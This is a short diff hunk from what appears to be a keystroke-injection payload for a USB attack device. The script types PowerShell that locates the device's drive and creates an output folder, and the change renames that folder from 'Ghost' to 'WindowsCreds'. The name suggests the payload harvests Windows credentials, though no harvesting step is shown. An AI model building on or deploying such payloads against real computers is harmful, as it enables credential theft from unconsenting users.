@@ -15,7 +15,7 @@ QUACK DELAY 1000
 QUACK STRING "\$drive=(Get-PSDrive -PSProvider FileSystem | ?{Test-Path(\"\$(\$_.Root)payloads\")}).Root"
 QUACK ENTER
 QUACK DELAY 100
-QUACK STRING "\$out=Join-Path \$drive 'Ghost'"
+QUACK STRING "\$out=Join-Path \$drive 'WindowsCreds'"
 QUACK ENTER
 QUACK DELAY 100
 QUACK STRING "New-Item -Force -ItemType Directory -Path \$out | Out-Null"
